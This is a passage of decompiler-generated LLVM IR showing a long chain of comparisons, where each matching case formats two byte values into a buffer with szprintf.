  br i1 %v7_aed8, label %dec_label_pc_aee0, label %dec_label_pc_af08

dec_label_pc_aee0:                                ; preds = %dec_label_pc_aed4
  %v3_aeec = load i8, i8* @global_var_2687d.82, align 1
  %v3_aef8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_af04 = sext i8 %v3_aeec to i32
  %v6_af04 = sext i8 %v3_aef8 to i32
  %v8_af04 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b824.119 to i32), i32 %v4_af04, i32 %v6_af04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af08

dec_label_pc_af08:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_aee0
  %v7_af0c = icmp eq i32 %v2_ab54, 18
  br i1 %v7_af0c, label %dec_label_pc_af14, label %dec_label_pc_af3c

dec_label_pc_af14:                                ; preds = %dec_label_pc_af08
  %v3_af20 = load i8, i8* @global_var_2687d.82, align 1
  %v3_af2c = load i8, i8* @global_var_2687e.83, align 1
  %v4_af38 = sext i8 %v3_af20 to i32
  %v6_af38 = sext i8 %v3_af2c to i32
  %v8_af38 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b834.121 to i32), i32 %v4_af38, i32 %v6_af38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af08, %dec_label_pc_af14
  %v7_af40 = icmp eq i32 %v2_ab54, 19
  br i1 %v7_af40, label %dec_label_pc_af48, label %dec_label_pc_af70

dec_label_pc_af48:                                ; preds = %dec_label_pc_af3c
  %v3_af54 = load i8, i8* @global_var_2687d.82, align 1
  %v3_af60 = load i8, i8* @global_var_2687e.83, align 1
  %v4_af6c = sext i8 %v3_af54 to i32
  %v6_af6c = sext i8 %v3_af60 to i32
  %v8_af6c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b844.123 to i32), i32 %v4_af6c, i32 %v6_af6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_af48
  %v7_af74 = icmp eq i32 %v2_ab54, 20
  br i1 %v7_af74, label %dec_label_pc_af7c, label %dec_label_pc_afa4

dec_label_pc_af7c:                                ; preds = %dec_label_pc_af70
  %v3_af88 = load i8, i8* @global_var_2687d.82, align 1
  %v3_af94 = load i8, i8* @global_var_2687e.83, align 1
  %v4_afa0 = sext i8 %v3_af88 to i32
  %v6_afa0 = sext i8 %v3_af94 to i32
  %v8_afa0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b850.125 to i32), i32 %v4_afa0, i32 %v6_afa0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afa4

dec_label_pc_afa4:                                ; preds = %dec_label_pc_af70, %dec_label_pc_af7c
  %v7_afa8 = icmp eq i32 %v2_ab54, 21
  br i1 %v7_afa8, label %dec_label_pc_afb0, label %dec_label_pc_afd8

dec_label_pc_afb0:                                ; preds = %dec_label_pc_afa4
  %v3_afbc = load i8, i8* @global_var_2687d.82, align 1
  %v3_afc8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_afd4 = sext i8 %v3_afbc to i32
  %v6_afd4 = sext i8 %v3_afc8 to i32
  %v8_afd4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b85c.127 to i32), i32 %v4_afd4, i32 %v6_afd4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afd8

dec_label_pc_afd8:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_afb0
  %v7_afdc = icmp eq i32 %v2_ab54, 22
  br i1 %v7_afdc, label %dec_label_pc_afe4, label %dec_label_pc_b00c

dec_label_pc_afe4:                                ; preds = %dec_label_pc_afd8
  %v3_aff0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_affc = load i8, i8* @global_var_2687e.83, align 1
  %v4_b008 = sext i8 %v3_aff0 to i32
  %v6_b008 = sext i8 %v3_affc to i32
  %v8_b008 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b86c.129 to i32), i32 %v4_b008, i32 %v6_b008, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b00c

dec_label_pc_b00c:                                ; preds = %dec_label_pc_afd8, %dec_label_pc_afe4
  %v7_b010 = icmp eq i32 %v2_ab54, 23
  br i1 %v7_b010, label %dec_label_pc_b018, label %dec_label_pc_b040

dec_label_pc_b018:                                ; preds = %dec_label_pc_b00c
  %v3_b024 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b030 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b03c = sext i8 %v3_b024 to i32
  %v6_b03c = sext i8 %v3_b030 to i32
  %v8_b03c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b878.131 to i32), i32 %v4_b03c, i32 %v6_b03c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b040

dec_label_pc_b040:                                ; preds = %dec_label_pc_b00c, %dec_label_pc_b018
  %v7_b044 = icmp eq i32 %v2_ab54, 24
  br i1 %v7_b044, label %dec_label_pc_b04c, label %dec_label_pc_b074

dec_label_pc_b04c:                                ; preds = %dec_label_pc_b040
  %v3_b058 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b064 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b070 = sext i8 %v3_b058 to i32
  %v6_b070 = sext i8 %v3_b064 to i32
  %v8_b070 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b884.133 to i32), i32 %v4_b070, i32 %v6_b070, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b074

dec_label_pc_b074:                                ; preds = %dec_label_pc_b040, %dec_label_pc_b04c
  %v7_b078 = icmp eq i32 %v2_ab54, 25
  br i1 %v7_b078, label %dec_label_pc_b080, label %dec_label_pc_b0a8

dec_label_pc_b080:                                ; preds = %dec_label_pc_b074
  %v3_b08c = load i8, i8* @global_var_2687d.82, align 1
  %v3_b098 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b0a4 = sext i8 %v3_b08c to i32
  %v6_b0a4 = sext i8 %v3_b098 to i32
  %v8_b0a4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b890.135 to i32), i32 %v4_b0a4, i32 %v6_b0a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0a8

dec_label_pc_b0a8:                                ; preds = %dec_label_pc_b074, %dec_label_pc_b080
  %v7_b0ac = icmp eq i32 %v2_ab54, 26
  br i1 %v7_b0ac, label %dec_label_pc_b0b4, label %dec_label_pc_b0dc

dec_label_pc_b0b4:                                ; preds = %dec_label_pc_b0a8
  %v3_b0c0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b0cc = load i8, i8* @global_var_2687e.83, align 1
  %v4_b0d8 = sext i8 %v3_b0c0 to i32
  %v6_b0d8 = sext i8 %v3_b0cc to i32
  %v8_b0d8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b89c.137 to i32), i32 %v4_b0d8, i32 %v6_b0d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0dc

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0a8, %dec_label_pc_b0b4
  %v7_b0e0 = icmp eq i32 %v2_ab54, 27
  br i1 %v7_b0e0, label %dec_label_pc_b0e8, label %dec_label_pc_b110

dec_label_pc_b0e8:                                ; preds = %dec_label_pc_b0dc
  %v3_b0f4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b100 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b10c = sext i8 %v3_b0f4 to i32
  %v6_b10c = sext i8 %v3_b100 to i32
  %v8_b10c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b8a8.139 to i32), i32 %v4_b10c, i32 %v6_b10c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b110

dec_label_pc_b110:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b0e8
  %v7_b114 = icmp eq i32 %v2_ab54, 28
  br i1 %v7_b114, label %dec_label_pc_b11c, label %dec_label_pc_b144

dec_label_pc_b11c:                                ; preds = %dec_label_pc_b110
  %v3_b128 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b134 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b140 = sext i8 %v3_b128 to i32
  %v6_b140 = sext i8 %v3_b134 to i32
  %v8_b140 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b8b8.141 to i32), i32 %v4_b140, i32 %v6_b140, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b144

dec_label_pc_b144:                                ; preds = %dec_label_pc_b110, %dec_label_pc_b11c
  %v7_b148 = icmp eq i32 %v2_ab54, 29
  br i1 %v7_b148, label %dec_label_pc_b150, label %dec_label_pc_b178

dec_label_pc_b150:                                ; preds = %dec_label_pc_b144
  %v3_b15c = load i8, i8* @global_var_2687d.82, align 1
  %v3_b168 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b174 = sext i8 %v3_b15c to i32
  %v6_b174 = sext i8 %v3_b168 to i32
  %v8_b174 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b8c8.143 to i32), i32 %v4_b174, i32 %v6_b174, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b178

dec_label_pc_b178:                                ; preds = %dec_label_pc_b144, %dec_label_pc_b150
  %v7_b17c = icmp eq i32 %v2_ab54, 30
  br i1 %v7_b17c, label %dec_label_pc_b184, label %dec_label_pc_b1ac

dec_label_pc_b184:                                ; preds = %dec_label_pc_b178
  %v3_b190 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b19c = load i8, i8* @global_var_2687e.83, align 1
  %v4_b1a8 = sext i8 %v3_b190 to i32
  %v6_b1a8 = sext i8 %v3_b19c to i32
  %v8_b1a8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b8d4.145 to i32), i32 %v4_b1a8, i32 %v6_b1a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b178, %dec_label_pc_b184
  %v7_b1b0 = icmp eq i32 %v2_ab54, 31
  br i1 %v7_b1b0, label %dec_label_pc_b1b8, label %dec_label_pc_b1e0

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1ac
  %v3_b1c4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b1d0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b1dc = sext i8 %v3_b1c4 to i32
  %v6_b1dc = sext i8 %v3_b1d0 to i32
  %v8_b1dc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b8e4.147 to i32), i32 %v4_b1dc, i32 %v6_b1dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1e0

dec_label_pc_b1e0:                                ; preds = %dec_label_pc_b1ac, %dec_label_pc_b1b8
  %v7_b1e4 = icmp eq i32 %v2_ab54, 32
  br i1 %v7_b1e4, label %dec_label_pc_b1ec, label %dec_label_pc_b214

dec_label_pc_b1ec:                                ; preds = %dec_label_pc_b1e0
  %v3_b1f8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b204 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b210 = sext i8 %v3_b1f8 to i32
  %v6_b210 = sext i8 %v3_b204 to i32
  %v8_b210 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b8f0.149 to i32), i32 %v4_b210, i32 %v6_b210, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b1e0, %dec_label_pc_b1ec
  %v7_b218 = icmp eq i32 %v2_ab54, 33
  br i1 %v7_b218, label %dec_label_pc_b220, label %dec_label_pc_b248

dec_label_pc_b220:                                ; preds = %dec_label_pc_b214
  %v3_b22c = load i8, i8* @global_var_2687d.82, align 1
  %v3_b238 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b244 = sext i8 %v3_b22c to i32
  %v6_b244 = sext i8 %v3_b238 to i32
  %v8_b244 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b8fc.151 to i32), i32 %v4_b244, i32 %v6_b244, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b248

dec_label_pc_b248:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b220
  %v7_b24c = icmp eq i32 %v2_ab54, 34
  br i1 %v7_b24c, label %dec_label_pc_b254, label %dec_label_pc_b27c

dec_label_pc_b254:                                ; preds = %dec_label_pc_b248
  %v3_b260 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b26c = load i8, i8* @global_var_2687e.83, align 1
  %v4_b278 = sext i8 %v3_b260 to i32
  %v6_b278 = sext i8 %v3_b26c to i32
  %v8_b278 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b908.153 to i32), i32 %v4_b278, i32 %v6_b278, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b27c

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b248, %dec_label_pc_b254
  %v7_b280 = icmp eq i32 %v2_ab54, 35
  br i1 %v7_b280, label %dec_label_pc_b288, label %dec_label_pc_b2b0

dec_label_pc_b288:                                ; preds = %dec_label_pc_b27c
  %v3_b294 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b2a0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b2ac = sext i8 %v3_b294 to i32
  %v6_b2ac = sext i8 %v3_b2a0 to i32
  %v8_b2ac = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b914.155 to i32), i32 %v4_b2ac, i32 %v6_b2ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b27c, %dec_label_pc_b288
  %v7_b2b4 = icmp eq i32 %v2_ab54, 36
  br i1 %v7_b2b4, label %dec_label_pc_b2bc, label %dec_label_pc_b2e4

dec_label_pc_b2bc:                                ; preds = %dec_label_pc_b2b0
  %v3_b2c8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b2d4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b2e0 = sext i8 %v3_b2c8 to i32
  %v6_b2e0 = sext i8 %v3_b2d4 to i32
  %v8_b2e0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b920.157 to i32), i32 %v4_b2e0, i32 %v6_b2e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2e4

dec_label_pc_b2e4:                                ; preds = %dec_label_pc_b2b0, %dec_label_pc_b2bc
  %v7_b2e8 = icmp eq i32 %v2_ab54, 37
  br i1 %v7_b2e8, label %dec_label_pc_b2f0, label %dec_label_pc_b318

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2e4
  %v3_b2fc = load i8, i8* @global_var_2687d.82, align 1
  %v3_b308 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b314 = sext i8 %v3_b2fc to i32
  %v6_b314 = sext i8 %v3_b308 to i32
  %v8_b314 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b92c.159 to i32), i32 %v4_b314, i32 %v6_b314, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b318

dec_label_pc_b318:                                ; preds = %dec_label_pc_b2e4, %dec_label_pc_b2f0
  %v7_b31c = icmp eq i32 %v2_ab54, 38
  br i1 %v7_b31c, label %dec_label_pc_b324, label %dec_label_pc_b34c

dec_label_pc_b324:                                ; preds = %dec_label_pc_b318
  %v3_b330 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b33c = load i8, i8* @global_var_2687e.83, align 1
  %v4_b348 = sext i8 %v3_b330 to i32
  %v6_b348 = sext i8 %v3_b33c to i32
  %v8_b348 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b938.161 to i32), i32 %v4_b348, i32 %v6_b348, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b34c

dec_label_pc_b34c:                                ; preds = %dec_label_pc_b318, %dec_label_pc_b324
  %v7_b350 = icmp eq i32 %v2_ab54, 39
  br i1 %v7_b350, label %dec_label_pc_b358, label %dec_label_pc_b380

dec_label_pc_b358:                                ; preds = %dec_label_pc_b34c
  %v3_b364 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b370 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b37c = sext i8 %v3_b364 to i32
  %v6_b37c = sext i8 %v3_b370 to i32
  %v8_b37c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b948.163 to i32), i32 %v4_b37c, i32 %v6_b37c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b380

dec_label_pc_b380:                                ; preds = %dec_label_pc_b34c, %dec_label_pc_b358
  %v7_b384 = icmp eq i32 %v2_ab54, 40
  br i1 %v7_b384, label %dec_label_pc_b38c, label %dec_label_pc_b3b4

dec_label_pc_b38c:                                ; preds = %dec_label_pc_b380
  %v3_b398 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b3a4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b3b0 = sext i8 %v3_b398 to i32
  %v6_b3b0 = sext i8 %v3_b3a4 to i32
  %v8_b3b0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b938.161 to i32), i32 %v4_b3b0, i32 %v6_b3b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b380, %dec_label_pc_b38c
  %v7_b3b8 = icmp eq i32 %v2_ab54, 41
  br i1 %v7_b3b8, label %dec_label_pc_b3c0, label %dec_label_pc_b3e8

dec_label_pc_b3c0:                                ; preds = %dec_label_pc_b3b4
  %v3_b3cc = load i8, i8* @global_var_2687d.82, align 1
  %v3_b3d8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b3e4 = sext i8 %v3_b3cc to i32
  %v6_b3e4 = sext i8 %v3_b3d8 to i32
  %v8_b3e4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b958.165 to i32), i32 %v4_b3e4, i32 %v6_b3e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3e8

dec_label_pc_b3e8:                                ; preds = %dec_label_pc_b3b4, %dec_label_pc_b3c0
  %v7_b3ec = icmp eq i32 %v2_ab54, 42
  br i1 %v7_b3ec, label %dec_label_pc_b3f4, label %dec_label_pc_b41c

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e8
  %v3_b400 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b40c = load i8, i8* @global_var_2687e.83, align 1
  %v4_b418 = sext i8 %v3_b400 to i32
  %v6_b418 = sext i8 %v3_b40c to i32
  %v8_b418 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b968.167 to i32), i32 %v4_b418, i32 %v6_b418, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b41c

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b3e8, %dec_label_pc_b3f4
  %v7_b420 = icmp eq i32 %v2_ab54, 43
  br i1 %v7_b420, label %dec_label_pc_b428, label %dec_label_pc_b450

dec_label_pc_b428:                                ; preds = %dec_label_pc_b41c
  %v3_b434 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b440 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b44c = sext i8 %v3_b434 to i32
  %v6_b44c = sext i8 %v3_b440 to i32
  %v8_b44c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b978.169 to i32), i32 %v4_b44c, i32 %v6_b44c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b41c, %dec_label_pc_b428
  %v7_b454 = icmp eq i32 %v2_ab54, 44
  br i1 %v7_b454, label %dec_label_pc_b45c, label %dec_label_pc_b484

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b450
  %v3_b468 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b474 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b480 = sext i8 %v3_b468 to i32
  %v6_b480 = sext i8 %v3_b474 to i32
  %v8_b480 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b968.167 to i32), i32 %v4_b480, i32 %v6_b480, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b484

dec_label_pc_b484:                                ; preds = %dec_label_pc_b450, %dec_label_pc_b45c
  %v7_b488 = icmp eq i32 %v2_ab54, 45
  br i1 %v7_b488, label %dec_label_pc_b490, label %dec_label_pc_b4b8

dec_label_pc_b490:                                ; preds = %dec_label_pc_b484
  %v3_b49c = load i8, i8* @global_var_2687d.82, align 1
  %v3_b4a8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b4b4 = sext i8 %v3_b49c to i32
  %v6_b4b4 = sext i8 %v3_b4a8 to i32
  %v8_b4b4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b988.171 to i32), i32 %v4_b4b4, i32 %v6_b4b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4b8

dec_label_pc_b4b8:                                ; preds = %dec_label_pc_b484, %dec_label_pc_b490
  %v7_b4bc = icmp eq i32 %v2_ab54, 46
  br i1 %v7_b4bc, label %dec_label_pc_b4c4, label %dec_label_pc_b4ec

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4b8
  %v3_b4d0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b4dc = load i8, i8* @global_var_2687e.83, align 1
  %v4_b4e8 = sext i8 %v3_b4d0 to i32
  %v6_b4e8 = sext i8 %v3_b4dc to i32
  %v8_b4e8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b998.173 to i32), i32 %v4_b4e8, i32 %v6_b4e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4ec

dec_label_pc_b4ec:                                ; preds = %dec_label_pc_b4b8, %dec_label_pc_b4c4
  %v7_b4f0 = icmp eq i32 %v2_ab54, 47
  br i1 %v7_b4f0, label %dec_label_pc_b4f8, label %dec_label_pc_b520

dec_label_pc_b4f8:                                ; preds = %dec_label_pc_b4ec
  %v3_b504 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b510 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b51c = sext i8 %v3_b504 to i32
  %v6_b51c = sext i8 %v3_b510 to i32
  %v8_b51c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b9a8.175 to i32), i32 %v4_b51c, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b520

dec_label_pc_b520:                                ; preds = %dec_label_pc_b4ec, %dec_label_pc_b4f8
  %v7_b524 = icmp eq i32 %v2_ab54, 48
  br i1 %v7_b524, label %dec_label_pc_b52c, label %dec_label_pc_b554

dec_label_pc_b52c:                                ; preds = %dec_label_pc_b520
  %v3_b538 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b544 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b550 = sext i8 %v3_b538 to i32
  %v6_b550 = sext i8 %v3_b544 to i32
  %v8_b550 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b9b8.177 to i32), i32 %v4_b550, i32 %v6_b550, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b520, %dec_label_pc_b52c
  %v7_b558 = icmp eq i32 %v2_ab54, 49
  br i1 %v7_b558, label %dec_label_pc_b560, label %dec_label_pc_b588

dec_label_pc_b560:                                ; preds = %dec_label_pc_b554
  %v3_b56c = load i8, i8* @global_var_2687d.82, align 1
  %v3_b578 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b584 = sext i8 %v3_b56c to i32
  %v6_b584 = sext i8 %v3_b578 to i32
  %v8_b584 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b9c8.179 to i32), i32 %v4_b584, i32 %v6_b584, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b588

dec_label_pc_b588:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b560
  %v7_b58c = icmp eq i32 %v2_ab54, 50
  br i1 %v7_b58c, label %dec_label_pc_b594, label %dec_label_pc_b5bc

dec_label_pc_b594:                                ; preds = %dec_label_pc_b588
  %v3_b5a0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b5ac = load i8, i8* @global_var_2687e.83, align 1
  %v4_b5b8 = sext i8 %v3_b5a0 to i32
  %v6_b5b8 = sext i8 %v3_b5ac to i32
  %v8_b5b8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b9d8.181 to i32), i32 %v4_b5b8, i32 %v6_b5b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5bc

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b588, %dec_label_pc_b594
  %v7_b5c0 = icmp eq i32 %v2_ab54, 51
  br i1 %v7_b5c0, label %dec_label_pc_b5c8, label %dec_label_pc_b5f0

dec_label_pc_b5c8:                                ; preds = %dec_label_pc_b5bc
  %v3_b5d4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b5e0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b5ec = sext i8 %v3_b5d4 to i32
  %v6_b5ec = sext i8 %v3_b5e0 to i32
  %v8_b5ec = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b9e8.183 to i32), i32 %v4_b5ec, i32 %v6_b5ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f0

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b5bc, %dec_label_pc_b5c8
  %v7_b5f4 = icmp eq i32 %v2_ab54, 52
  br i1 %v7_b5f4, label %dec_label_pc_b5fc, label %dec_label_pc_b624

dec_label_pc_b5fc:                                ; preds = %dec_label_pc_b5f0
  %v3_b608 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b614 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b620 = sext i8 %v3_b608 to i32
  %v6_b620 = sext i8 %v3_b614 to i32
  %v8_b620 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b9f8.185 to i32), i32 %v4_b620, i32 %v6_b620, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b624

dec_label_pc_b624:                                ; preds = %dec_label_pc_b5f0, %dec_label_pc_b5fc
  %v7_b628 = icmp eq i32 %v2_ab54, 53
  br i1 %v7_b628, label %dec_label_pc_b630, label %dec_label_pc_b658

dec_label_pc_b630:                                ; preds = %dec_label_pc_b624
  %v3_b63c = load i8, i8* @global_var_2687d.82, align 1
  %v3_b648 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b654 = sext i8 %v3_b63c to i32
  %v6_b654 = sext i8 %v3_b648 to i32
  %v8_b654 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1ba08.187 to i32), i32 %v4_b654, i32 %v6_b654, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b658

dec_label_pc_b658:                                ; preds = %dec_label_pc_b624, %dec_label_pc_b630
  %v7_b65c = icmp eq i32 %v2_ab54, 54
  br i1 %v7_b65c, label %dec_label_pc_b664, label %dec_label_pc_b68c

dec_label_pc_b664:                                ; preds = %dec_label_pc_b658
  %v3_b670 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b67c = load i8, i8* @global_var_2687e.83, align 1
  %v4_b688 = sext i8 %v3_b670 to i32
  %v6_b688 = sext i8 %v3_b67c to i32
  %v8_b688 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1ba18.189 to i32), i32 %v4_b688, i32 %v6_b688, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b68c

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b658, %dec_label_pc_b664
  %v7_b690 = icmp eq i32 %v2_ab54, 55
  br i1 %v7_b690, label %dec_label_pc_b698, label %dec_label_pc_b6c0

dec_label_pc_b698:                                ; preds = %dec_label_pc_b68c
  %v3_b6a4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_b6b0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_b6bc = sext i8 %v3_b6a4 to i32
  %v6_b6bc = sext i8 %v3_b6b0 to i32
  %v8_b6bc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1ba28.191 to i32), i32 %v4_b6bc, i32 %v6_b6bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b68c, %dec_label_pc_b698
  %v7_b6c4 = icmp eq i32 %v2_ab54, 56
